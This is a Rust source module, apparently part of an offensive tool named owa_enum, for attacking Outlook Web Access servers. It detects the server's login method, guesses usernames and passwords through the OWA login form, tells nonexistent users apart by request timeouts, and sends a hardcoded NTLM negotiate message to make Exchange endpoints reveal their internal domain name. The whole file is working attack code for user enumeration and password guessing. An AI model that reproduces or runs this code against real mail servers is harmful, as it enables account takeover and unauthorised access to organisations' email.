use reqwest::blocking::{Client};
use reqwest::header;
use std::fmt;
use std::error::Error;
use owa_enum::{Color, err, log, msg};
use super::ntlm::NTLM;

const OWA_ENDPOINTS: [&str; 5] = ["/ews",
                                  "/autodiscover/autodiscover.xml",
                                  "/rpc",
                                  "/mapi",
                                  "/oab"];

const OWA_BASE: &str = "/owa/";
const OWA_LOGIN: &str = concat!("/owa", "/auth.owa");

#[derive(Debug)]
pub enum OwaResult {
    UserNotFound,
    UserExists,
    PasswordValid,
}

#[derive(Debug, PartialEq)]
pub enum OwaAuthMethod {
    Form,
    Ntlm,
    Basic,
    Oauth,
    Unknown,
}

impl fmt::Display for OwaAuthMethod {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{:?}", self)
    }
}

#[derive(Debug)]
pub struct Owa {
    uri: String,
    domain: String,
    http_client: Client
}

impl Owa {
    pub fn new(http_client: Client, uri: String, domain: Option<String>) -> Self {
        Self {
            uri: uri,
            domain: domain.unwrap_or("".to_string()),
            http_client: http_client
        }
    }

    pub fn get_auth_method(&self) -> OwaAuthMethod {
        match self.http_client.get(format!("{}{}", &self.uri, OWA_BASE)).send() {
            Ok(res) => {
                if let Some(location) = res.headers().get("Location") {
                    let location = location.to_str().unwrap_or("");
                    return if location.contains("/owa/auth") { OwaAuthMethod::Form }
                           else if location.contains("login.microsoftonline.com") { OwaAuthMethod::Oauth }
                           else { OwaAuthMethod::Unknown }
                } else if ! res.headers().get("WWW-Authenticate").is_none() {
                    for authenticate in res.headers().get_all("WWW-Authenticate").iter() {
                        let authenticate_val = authenticate.to_str().unwrap_or("");
                        if authenticate_val.contains("NTLM") { return OwaAuthMethod::Ntlm; }
                    }
                    return OwaAuthMethod::Unknown;
                } else {
                    return OwaAuthMethod::Unknown;
                }
            }
            Err(e) => {
                err!("Got {}", e);
                return OwaAuthMethod::Unknown;
            }
        }
    }

    pub fn get_domain(&self) -> String {
        self.domain.clone()
    }

    pub fn user_exists(&self, user: &str, password: &str) -> OwaResult {
        let login_data = [
                          ("destination", format!("{}{}", self.uri, "/owa")),
                          ("flags", "4".to_string()),
                          ("forcedownlevel", "0".to_string()),
                          ("username", format!("{}\\{}", self.domain, user)),
                          ("password", password.to_string()),
                          ("passwordText", "".to_string()),
                          ("isUtf8", "1".to_string())
                         ];

        match self.http_client.post(format!("{}{}", self.uri, OWA_LOGIN))
                              .form(&login_data)
                              .send()
        {
            Ok(res) => {
                if let Some(location) = res.headers().get("Location") {
                    let location_str = location.to_str().unwrap_or("");
                    if location_str.contains("/auth/logon.aspx") &&
                       location_str.contains("reason=") {
                        return OwaResult::UserExists
                    }
                }
                return OwaResult::PasswordValid;
            }
            Err(e) => {
                if e.is_timeout(){
                    return OwaResult::UserNotFound;
                } else {
                    log!("Got {:?}", e);
                    return OwaResult::UserExists;
                }
            }
        }
    }

    fn get_endpoint_url(&self) -> Result<&str, &str> {
        for endpoint in OWA_ENDPOINTS {
            let url = format!("{}{}", self.uri, endpoint);
            match self.http_client.get(&url).send(){
                Ok(response) => {
                    if response.status() == reqwest::StatusCode::UNAUTHORIZED {
                        return Ok(endpoint);
                    }
                }
                Err(e) => {}
            }
        }
        Err("No endpoint found")
    }

    pub fn get_domain_name(&mut self) -> Result<(), Box<dyn Error>> {
        if self.domain != "" {
            return Ok(());
        }
        let mut headers = header::HeaderMap::new();
        headers.insert(header::AUTHORIZATION,
                       header::HeaderValue::from_static("NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="));

        if let Ok(endpoint) = self.get_endpoint_url() {
            let url = format!("{}{}", self.uri.clone(), endpoint);
            msg!("Endpoint used: {}", Color::wrap(&url, Color::CYAN));
            match self.http_client.get(url).headers(headers).send() {
                Ok(res) => {
                        if let Some(ntlm_response) = res.headers()
                                                        .get("WWW-Authenticate")
                                                        .expect("No WWW-Authenticate header")
                                                        .to_str()?
                                                        .strip_prefix("NTLM "){
                            match NTLM::parse_domain(ntlm_response){
                                Ok(domain) => {
                                    self.domain = domain;
                                    return Ok(());
                                }
                                Err(e) => {return Err(e);}
                            }
                        }
                        return Err("Cannot find domain name in response".into());
                    }
               Err(e) => return Err(format!("Http client error: {}", e).into()),
            }
        }
        Err("No NTLM authent found".into())
    }
}
